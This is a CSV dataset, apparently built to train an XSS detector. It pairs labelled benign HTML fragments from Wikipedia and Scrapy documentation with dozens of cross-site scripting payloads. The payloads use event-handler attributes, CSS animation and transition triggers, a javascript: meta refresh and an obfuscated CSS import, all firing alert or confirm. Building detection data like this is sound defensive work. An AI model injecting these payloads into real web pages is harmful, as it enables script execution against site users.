,Sentence,Label
8487,"<p>Artificial Intelligence has inspired numerous creative applications including its usage to produce visual art. The exhibition ""Thinking Machines: Art and Design in the Computer Age, 1959–1989"" at MoMA<sup id=""cite_ref-moma_343-0"" class=""reference""><a href=""#cite_note-moma-343"">&#91;332&#93; </a> </sup> provides a good overview of the historical applications of AI for art, architecture, and design. Recent exhibitions showcasing the usage of AI to produce art include the Google-sponsored benefit and auction at the Gray Area Foundation in San Francisco, where artists experimented with the <a href=""/wiki/DeepDream"" title=""DeepDream"">DeepDream </a> algorithm<sup id=""cite_ref-wp1_344-0"" class=""reference""><a href=""#cite_note-wp1-344"">&#91;333&#93; </a> </sup> and the exhibition ""Unhuman: Art in the Age of AI,"" which took place in Los Angeles and Frankfurt in the fall of 2017.<sup id=""cite_ref-sf_345-0"" class=""reference""><a href=""#cite_note-sf-345"">&#91;334&#93; </a> </sup><sup id=""cite_ref-artsy_346-0"" class=""reference""><a href=""#cite_note-artsy-346"">&#91;335&#93; </a> </sup> In the spring of 2018, the Association of Computing Machinery dedicated a special magazine issue to the subject of computers and art highlighting the role of machine learning in the arts.<sup id=""cite_ref-acm_347-0"" class=""reference""><a href=""#cite_note-acm-347"">&#91;336&#93; </a> </sup> The Austrian <a href=""/wiki/Ars_Electronica"" title=""Ars Electronica"">Ars Electronica </a> and <a href=""/wiki/Museum_of_Applied_Arts,_Vienna"" title=""Museum of Applied Arts, Vienna"">Museum of Applied Arts, Vienna </a> opened exhibitions on AI in 2019.<sup id=""cite_ref-Ars_Electronica_Exhibition_&#39;&#39;Understanding_AI&#39;&#39;_348-0"" class=""reference""><a href=""#cite_note-Ars_Electronica_Exhibition_&#39;&#39;Understanding_AI&#39;&#39;-348"">&#91;337&#93; </a> </sup><sup id=""cite_ref-Museum_of_Applied_Arts_Exhibition_&#39;&#39;Uncanny_Values&#39;&#39;_349-0"" class=""reference""><a href=""#cite_note-Museum_of_Applied_Arts_Exhibition_&#39;&#39;Uncanny_Values&#39;&#39;-349"">&#91;338&#93; </a> </sup> The Ars Electronica's 2019 festival ""Out of the box"" extensively thematized the role of arts for a sustainable societal transformation with AI.<sup id=""cite_ref-European_Platform_for_Digital_Humanism_350-0"" class=""reference""><a href=""#cite_note-European_Platform_for_Digital_Humanism-350"">&#91;339&#93; </a> </sup>",0
8488,"<font onkeyup=""alert(1)"" contenteditable>test</font>",1
8489,<meter onpointerdown=alert(1)>XSS</meter>,1
8490,"<style>@keyframes slidein {}</style><del style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></del>",1
8491,"<ul><li><a href=""/wiki/Robotic_arm"" title=""Robotic arm"">arm </a> </li> </ul> </li>",0
8492,"<style>@keyframes x{}</style><figcaption style=""animation-name:x"" onanimationstart=""alert(1)""></figcaption>",1
8493, </li>,0
8494,"<li id=""cite_note-Gaussian_mixture_model-226""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Gaussian_mixture_model_226-0"">^ </a> </b> ",0
8495,"<menuitem draggable=""true"" ondrag=""alert(1)"">test</menuitem>",1
8496,"<dd>""Every aspect of learning or any other feature of intelligence can be so precisely described that a machine can be made to simulate it."" This conjecture was printed in the proposal for the Dartmouth Conference of 1956.<sup id=""cite_ref-Dartmouth_proposal_352-0"" class=""reference""><a href=""#cite_note-Dartmouth_proposal-352"">&#91;341&#93; </a> </sup> </dd> </dl>",0
8497,"<style>@keyframes x{}</style><section style=""animation-name:x"" onanimationend=""alert(1)""></section>",1
8498,"<div role=""navigation"" class=""navbox"" aria-labelledby=""Evolutionary_computation"" style=""padding:3px""><table class=""nowraplinks mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"">",0
8499,	 </span> 2015 ,0
8500,<q onblur=alert(1) tabindex=1 id=x></q><input autofocus>,1
8501,"<label onmouseup=""alert(1)"">test</label>",1
8502,"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;298–305 </li>",0
8503,"<li><a href=""/wiki/Charles_Fran%C3%A7ois_(systems_scientist)"" title=""Charles François (systems scientist)"">Charles François </a> </li>",0
8504,	 </span> </a> </li>,0
8505,<font id=x tabindex=1 onbeforedeactivate=alert(1)></font><input autofocus>,1
8506,"<del onmouseover=""alert(1)"">test</del>",1
8507,<nextid onpointerenter=alert(1)>XSS</nextid>,1
8508,"<p>Scrapy is a fast high-level <a class=""reference external"" href=""https://en.wikipedia.org/wiki/Web_crawler"">web crawling</a> and <a class=""reference external"" href=""https://en.wikipedia.org/wiki/Web_scraping"">web scraping</a> framework, used",0
8509,"<p onkeyup=""alert(1)"" contenteditable>test</p>",1
8510,"<caption onmouseenter=""alert(1)"">test</caption>",1
8511,	 </span>,0
8512,"<p class=""caption""><span class=""caption-text"">Basic concepts",0
8513,"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;91–104 </li>",0
8514,"<form draggable=""true"" ondragenter=""alert(1)"">test</form>",1
8515,"		<div class=""body"">",0
8516,"<applet onmouseenter=""alert(1)"">test</applet>",1
8517,	 </span>,0
8518,"<li id=""cite_note-FOOTNOTEMarkoff2011-45""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEMarkoff2011_45-0"">^ </a> </b> ",0
8519," </p><p>In the late 1990s and early 21st century, AI began to be used for logistics, <a href=""/wiki/Data_mining"" title=""Data mining"">data mining </a>, <a href=""/wiki/Medical_diagnosis"" title=""Medical diagnosis"">medical diagnosis </a> and other areas.<sup id=""cite_ref-AI_widely_used_25-1"" class=""reference""><a href=""#cite_note-AI_widely_used-25"">&#91;25&#93; </a> </sup> The success was due to increasing computational power (see <a href=""/wiki/Moore%27s_law"" title=""Moore&#39;s law"">Moore's law </a> and <a href=""/wiki/Transistor_count"" title=""Transistor count"">transistor count </a>), greater emphasis on solving specific problems, new ties between AI and other fields (such as <a href=""/wiki/Statistics"" title=""Statistics"">statistics </a>, <a href=""/wiki/Economics"" title=""Economics"">economics </a> and <a href=""/wiki/Mathematical_optimization"" title=""Mathematical optimization"">mathematics </a>), and a commitment by researchers to mathematical methods and scientific standards.<sup id=""cite_ref-Formal_methods_in_AI_43-0"" class=""reference""><a href=""#cite_note-Formal_methods_in_AI-43"">&#91;43&#93; </a> </sup> <a href=""/wiki/IBM_Deep_Blue"" class=""mw-redirect"" title=""IBM Deep Blue"">Deep Blue </a> became the first computer chess-playing system to beat a reigning world chess champion, <a href=""/wiki/Garry_Kasparov"" title=""Garry Kasparov"">Garry Kasparov </a>, on 11 May 1997.<sup id=""cite_ref-FOOTNOTEMcCorduck2004480–483_44-0"" class=""reference""><a href=""#cite_note-FOOTNOTEMcCorduck2004480–483-44"">&#91;44&#93; </a> </sup>",0
8520,<param onpointerout=alert(1)>XSS</param>,1
8521,"<li><a href=""/wiki/Property_dualism"" title=""Property dualism"">Property dualism </a> </li>",0
8522,"<style>:target {transform: rotate(180deg);}</style><abbr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></abbr>",1
8523,"<a href=""/wiki/Causality#Causal_calculus"" title=""Causality"">Causal calculus </a>:",0
8524,"<h2><span class=""mw-headline"" id=""Basics"">Basics ",0
8525,<map onpointerenter=alert(1)>XSS</map>,1
8526,  </div>,0
8527,"<tbody onbeforecopy=""alert(1)"" contenteditable>test</tbody>",1
8528,"<STYLE>@im\port'\ja\vasc\ript:alert("""")';</STYLE>",1
8529,"<meter ondblclick=""alert(1)"">test</meter>",1
8530,<discard onpointerover=alert(1)>XSS</discard>,1
8531,<input2 onpointerover=alert(1)>XSS</input2>,1
8532,"	 </span> <span class=""toctext"">Computational intelligence and soft computing ",0
8533,"<xmp onkeydown=""alert(1)"" contenteditable>test</xmp>",1
8534,<strong onpointerenter=alert(1)>XSS</strong>,1
8535,"<li><a href=""/wiki/Intertheoretic_reduction"" title=""Intertheoretic reduction"">Intertheoretic reduction </a> </li>",0
8536,<caption onpointerup=alert(1)>XSS</caption>,1
8537,"<link onmouseup=""alert(1)"">test</link>",1
8538,"<dt><a class=""reference internal"" href=""topics/autothrottle.html""><span class=""doc"">AutoThrottle extension",0
8539,<q onpointerenter=alert(1)>XSS</q>,1
8540,"<meta http-equiv=""refresh"" content=""0;url=javascript:confirm(1)"">",1
8541,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Artsy&amp;rft.atitle=It%27s+Getting+Hard+to+Tell+If+a+Painting+Was+Made+by+a+Computer+or+a+Human&amp;rft.date=2017-09-21&amp;rft.aulast=Chun&amp;rft.aufirst=Rene&amp;rft_id=https%3A%2F%2Fwww.artsy.net%2Farticle%2Fartsy-editorial-hard-painting-made-computer-human&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
8542,"tYPE=""text/x-scriptlet"" DATA=""http://.rocks/scriptlet.html",1
8543,Breadth of commonsense knowledge:,0
8544,	 </span> </a> </li>,0
8545,"<p>Physicist <a href=""/wiki/Stephen_Hawking"" title=""Stephen Hawking"">Stephen Hawking </a>, <a href=""/wiki/Microsoft"" title=""Microsoft"">Microsoft </a> founder <a href=""/wiki/Bill_Gates"" title=""Bill Gates"">Bill Gates </a>, and <a href=""/wiki/SpaceX"" title=""SpaceX"">SpaceX </a> founder <a href=""/wiki/Elon_Musk"" title=""Elon Musk"">Elon Musk </a> have expressed concerns about the possibility that AI could evolve to the point that humans could not control it, with Hawking theorizing that this could ""<a href=""/wiki/Global_catastrophic_risk"" title=""Global catastrophic risk"">spell the end of the human race </a>"".<sup id=""cite_ref-364"" class=""reference""><a href=""#cite_note-364"">&#91;353&#93; </a> </sup><sup id=""cite_ref-Holley_365-0"" class=""reference""><a href=""#cite_note-Holley-365"">&#91;354&#93; </a> </sup><sup id=""cite_ref-366"" class=""reference""><a href=""#cite_note-366"">&#91;355&#93; </a> </sup>",0
8546,"<ul><li><a href=""/wiki/Edward_Fredkin"" title=""Edward Fredkin"">Edward Fredkin </a> is quoted in <a href=""#CITEREFMcCorduck2004"">McCorduck (2004 </a>, p.&#160;401). </li>",0
8547,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rtc id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></rtc>",1
8548,"<noscript draggable=""true"" ondragenter=""alert(1)"">test</noscript>",1
8549,"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a> </li>",0
8550,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0
8551,"<h1 onkeyup=""alert(1)"" contenteditable>test</h1>",1
8552,"<p>The <a href=""/wiki/Cybersecurity"" class=""mw-redirect"" title=""Cybersecurity"">cybersecurity </a> arena faces significant challenges in the form of larges scale hacking attacks of different types which harm organizations of all kinds and create billions of dollars in business damage. Artificial intelligence and Natural Language Processing (NLP) has begun to be used by security companies - for example SIEM (Security Information and Event Management) solutions.  The more advanced of these solutions use AI and NLP to automatically sort the data in networks into high risk and low risk information.  This enables security teams to focus on the attacks that have the potential to do real harm to the organization, and not become victims of attacks such as <a href=""/wiki/Denial-of-service_attack"" title=""Denial-of-service attack"">Denial of Service (DoS) </a>, <a href=""/wiki/Malware"" title=""Malware"">Malware </a> and others.",0
8553,<isindex onfocusout=alert(1) tabindex=1 id=x></isindex><input autofocus>,1
8554,<center onpointerout=alert(1)>XSS</center>,1
8555,"<small onmouseenter=""alert(1)"">test</small>",1
8556,"<li><a href=""/wiki/Ernst_von_Glasersfeld"" title=""Ernst von Glasersfeld"">Ernst von Glasersfeld </a> </li>",0
8557,"<code onbeforecopy=""alert(1)"" contenteditable>test</code>",1
8558,	 </span> 2019 ,0
8559,"<li class=""toclevel-3 tocsection-23""><a href=""#Computational_intelligence_and_soft_computing""><span class=""tocnumber"">5.3.2 ",0
8560,"       <div class=""rst-content"">",0
8561,"<li><a href=""/wiki/Biological_naturalism"" title=""Biological naturalism"">Biological naturalism </a> </li>",0
8562,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Financial+Times&amp;rft.atitle=AI+learns+to+read+Korean%2C+so+you+don%27t+have+to&amp;rft.date=2019-05-02&amp;rft.aulast=Croft&amp;rft.aufirst=Jane&amp;rft_id=https%3A%2F%2Fwww.ft.com%2Fcontent%2Ffef40df0-4a6a-11e9-bde6-79eaea5acb64&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
8563,<plaintext onpointerleave=alert(1)>XSS</plaintext>,1
8564,<sup onpointerup=alert(1)>XSS</sup>,1
8565,"<style>:target {transform: rotate(180deg);}</style><pre id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></pre>",1
8566,"<li><a href=""/wiki/Problem_of_induction"" title=""Problem of induction"">Problem of induction </a> </li>",0
8567,"<noembed draggable=""true"" ondragenter=""alert(1)"">test</noembed>",1
8568,"<image onmouseenter=""alert(1)"">test</image>",1
8569,"<style>:target {color:red;}</style><big id=x style=""transition:color 1s"" ontransitionend=alert(1)></big>",1
8570,"<optgroup onmouseleave=""alert(1)"">test</optgroup>",1
8571,<html id=x tabindex=1 onactivate=alert(1)></html>,1
8572,"<q onmouseup=""alert(1)"">test</q>",1
8573,"<dt><a class=""reference internal"" href=""intro/install.html""><span class=""doc"">Installation guide",0
8574,"<div draggable=""true"" contenteditable>drag me</div><legend ondrop=alert(1) contenteditable>drop here</legend>",1
8575,"<div class=""thumb tright"">",0
8576,<bgsound onpointerdown=alert(1)>XSS</bgsound>,1
8577,"<li id=""cite_note-47""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-47"">^ </a> </b> ",0
8578,<rb onpointerover=alert(1)>XSS</rb>,1
8579,"<ol ondblclick=""alert(1)"">test</ol>",1
8580,<menuitem id=x tabindex=1 onfocus=alert(1)></menuitem>,1
8581," </p><p><a href=""/wiki/Multi-agent_planning"" title=""Multi-agent planning"">Multi-agent planning </a> uses the <a href=""/wiki/Cooperation"" title=""Cooperation"">cooperation </a> and competition of many agents to achieve a given goal. <a href=""/wiki/Emergent_behavior"" class=""mw-redirect"" title=""Emergent behavior"">Emergent behavior </a> such as this is used by <a href=""/wiki/Evolutionary_algorithms"" class=""mw-redirect"" title=""Evolutionary algorithms"">evolutionary algorithms </a> and <a href=""/wiki/Swarm_intelligence"" title=""Swarm intelligence"">swarm intelligence </a>.<sup id=""cite_ref-Multi-agent_planning_114-0"" class=""reference""><a href=""#cite_note-Multi-agent_planning-114"">&#91;111&#93; </a> </sup>",0
8582,"<isindex draggable=""true"" ondragend=""alert(1)"">test</isindex>",1
8583,<s id=x tabindex=1 onfocus=alert(1)></s>,1
8584,<nav id=x tabindex=1 onfocus=alert(1)></nav>,1
8585,	 </span> 2018 ,0
8586,	 </span> </a> </li>,0
8587,<multicol onpointerdown=alert(1)>XSS</multicol>,1
8588,"<li id=""cite_note-AI_at_Edinburgh_and_France_in_the_60s-162""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-AI_at_Edinburgh_and_France_in_the_60s_162-0"">^ </a> </b> ",0
8589,"<li id=""cite_note-235""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-235"">^ </a> </b> ",0
8590,"<li><a href=""/wiki/Structuralism_(philosophy_of_science)"" title=""Structuralism (philosophy of science)"">Structuralism </a> </li>",0
8591,	 </h3>,0
8592,<textarea id=x tabindex=1 onbeforedeactivate=alert(1)></textarea><input autofocus>,1
8593,"<del onmouseenter=""alert(1)"">test</del>",1
8594, </div> </td> </tr> </tbody> </table> </div>,0
8595,<svg><strike onload=alert(1)></strike>,1
8596,"<li><a href=""/wiki/Semantic_Web"" title=""Semantic Web"">Semantic Web </a> </li>",0
8597,"<div role=""note"" class=""hatnote navigation-not-searchable"">Main articles: <a href=""/wiki/Bayesian_network"" title=""Bayesian network"">Bayesian network </a>, <a href=""/wiki/Hidden_Markov_model"" title=""Hidden Markov model"">Hidden Markov model </a>, <a href=""/wiki/Kalman_filter"" title=""Kalman filter"">Kalman filter </a>, <a href=""/wiki/Particle_filter"" title=""Particle filter"">Particle filter </a>, <a href=""/wiki/Decision_theory"" title=""Decision theory"">Decision theory </a>, and <a href=""/wiki/Utility_theory"" class=""mw-redirect"" title=""Utility theory"">Utility theory </a> </div>",0
8598,"<menuitem draggable=""true"" ondragstart=""alert(1)"">test</menuitem>",1
8599, </p>,0
8600,"          <dd><a href=""/en/1.1/"">1.1</a></dd>",0
8601,"<button onkeypress=""alert(1)"" contenteditable>test</button>",1
8602,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=WIRED&amp;rft.atitle=AI+Has+a+Hallucination+Problem+That%27s+Proving+Tough+to+Fix&amp;rft.date=2018&amp;rft_id=https%3A%2F%2Fwww.wired.com%2Fstory%2Fai-has-a-hallucination-problem-thats-proving-tough-to-fix%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
8603,"<li><a href=""/wiki/Tabula_rasa"" title=""Tabula rasa"">Tabula rasa </a> </li>",0
8604,	 </span> 2018 ,0
8605,"<acronym onmouseleave=""alert(1)"">test</acronym>",1
8606,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0
8607,"	 </span> </a>&#32;<span class=""metadata""> &#8211; <a href=""/wiki/Talk:Artificial_intelligence#Dubious"" title=""Talk:Artificial intelligence"">discuss </a> ",0
8608,"<li class=""toclevel-1 tocsection-3""><a href=""#Basics""><span class=""tocnumber"">3 ",0
8609,"<style>:target {color:red;}</style><em id=x style=""transition:color 1s"" ontransitionend=alert(1)></em>",1
8610,"<li><a href=""/wiki/Fact"" title=""Fact"">Fact </a> </li>",0
8611,"<thead oncontextmenu=""alert(1)"">test</thead>",1
8612,"<cite onkeydown=""alert(1)"" contenteditable>test</cite>",1
8613,"<head oncopy=""alert(1)"" contenteditable>test</head>",1
8614,"<sub draggable=""true"" ondragenter=""alert(1)"">test</sub>",1
8615,                latest,0
8616, </li>,0
8617,"<big onmouseover=""alert(1)"">test</big>",1
8618,"<center onbeforecut=""alert(1)"" contenteditable>test</center>",1
8619,"<p>There is no established unifying theory or <a href=""/wiki/Paradigm"" title=""Paradigm"">paradigm </a> that guides AI research. Researchers disagree about many issues.<sup id=""cite_ref-155"" class=""reference""><a href=""#cite_note-155"">&#91;152&#93; </a> </sup> A few of the most long standing questions that have remained unanswered are these: should artificial intelligence simulate natural intelligence by studying <a href=""/wiki/Psychology"" title=""Psychology"">psychology </a> or <a href=""/wiki/Neuroscience"" title=""Neuroscience"">neurobiology </a>? Or is <a href=""/wiki/Human_biology"" title=""Human biology"">human biology </a> as irrelevant to AI research as bird biology is to <a href=""/wiki/Aeronautical_engineering"" class=""mw-redirect"" title=""Aeronautical engineering"">aeronautical engineering </a>",0
8620,"	 </span> <span class=""reference-text""><cite class=""citation journal"">Schmidhuber, J. (1992). ""Learning complex, extended sequences using the principle of history compression"". <i>Neural Computation </i>. <b>4 </b> (2): 234–242. <a href=""/wiki/CiteSeerX"" title=""CiteSeerX"">CiteSeerX </a>&#160;<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.49.3934"">10.1.1.49.3934 </a> ",0
